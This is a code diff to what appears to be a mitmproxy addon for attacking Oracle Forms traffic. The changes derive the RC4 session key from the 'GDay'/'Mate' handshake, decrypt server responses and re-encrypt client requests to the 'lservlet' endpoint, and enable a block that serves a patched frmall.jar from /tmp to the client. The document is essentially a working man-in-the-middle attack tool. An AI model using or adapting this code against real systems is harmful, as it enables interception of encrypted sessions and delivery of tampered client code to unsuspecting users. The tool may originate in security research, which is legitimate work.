@@ -1,3 +1,4 @@
+import binascii
 import struct
 from mitmproxy import ctx
 
@@ -25,14 +26,14 @@ class RC4:
         self.state[self.p], self.state[self.q] = self.state[self.q], self.state[self.p]
         return self.state[(self.state[self.p] + self.state[self.q]) % 256]
 
-    def encrypt(self,inputString):
+    def encrypt(self,inputBytes):
         ##Encrypt input string returning a byte list
         
-        return [ord(p) ^ self.byteGenerator() for p in inputString]
+        return [p ^ self.byteGenerator() for p in inputBytes]
 
     def decrypt(self,inputByteList):
         ##Decrypt input byte list returning a string
-        return "".join([chr(c ^ self.byteGenerator()) for c in inputByteList])
+        return bytes([c ^ self.byteGenerator() for c in inputByteList])
 
     #def string_to_list(self,inputString):
     #    ##Convert a string into a byte list
@@ -54,22 +55,28 @@ class OracleForms:
         flow.request.http_version="HTTP/1.0" # Workaround for MitMproxy bug #1721
 
         if flow.request.content[0:4]==b"GDay":
+            self.key=[None]*5
+            self.mate=None
+            self.rc4_req=None
+            self.rc4_resp=None
             self.gday=struct.unpack(">I",flow.request.content[4:8])[0]
             ctx.log("Found GDay %X" % self.gday)
             return
         if self.key[0]!=None and "lservlet" in flow.request.url:
-            
-            ctx.log(repr(self.rc4_req.decrypt([c for c in flow.request.content])))
+            ctx.log("REQUEST:\n %s" % binascii.hexlify(flow.request.content))
+            flow.request.content=bytes(self.rc4_req.encrypt(flow.request.content))
+            #ctx.log(repr(self.rc4_req.decrypt([c for c in flow.request.content])))
 
     def response(self, flow):
-        """
+        
         if "frmall.jar" in flow.request.url:
+            ctx.log("Serving patched frmall.jar")
             patched=open("/tmp/frmall.jar","rb").read()
             flow.response.content=patched
             flow.response.headers["content-length"] = str(len(patched))
             flow.response.status_code=200
             return
-        """
+        
         if b"GDay" in flow.request.content:
             self.mate=struct.unpack(">I",flow.response.content[4:8])[0]
             ctx.log("Found Mate %s" % repr(flow.response.raw_content))
@@ -91,7 +98,8 @@ class OracleForms:
             ctx.log("RC4 initialized with key: %s" % (repr(self.key)))
             return
         if self.key[0]!=None and "lservlet" in flow.request.url:
-            ctx.log(repr(self.rc4_resp.decrypt([c for c in flow.request.content])))
+            flow.response.content=self.rc4_resp.decrypt([c for c in flow.response.content])
+            ctx.log("RESPONSE:\n %s" % binascii.hexlify(flow.response.content))
 
 def start():
     return OracleForms()
